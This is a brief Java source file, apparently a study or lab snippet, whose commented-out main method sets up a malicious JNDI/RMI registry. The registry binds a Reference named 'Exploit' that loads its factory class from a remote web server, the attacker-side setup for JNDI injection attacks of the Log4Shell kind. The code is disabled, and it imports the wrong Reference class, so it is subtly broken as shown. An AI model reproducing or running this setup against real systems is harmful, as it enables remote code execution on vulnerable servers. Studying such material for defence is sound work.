package com.houde.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.lang.ref.Reference;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author qiukun
 * @date 2021/12/13
 */
public class Main {

    public static void main(String[] args) throws Exception {
//        Registry registry = LocateRegistry.createRegistry(1099);
//        String remote_class_server = "http://192.168.1.200:8080/";
//        Reference reference = new Reference("Exploit", "Exploit", remote_class_server);
//        //reference的factory class参数指向了一个外部Web服务的地址
//        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
//        registry.bind("xxx", referenceWrapper);
    }
}
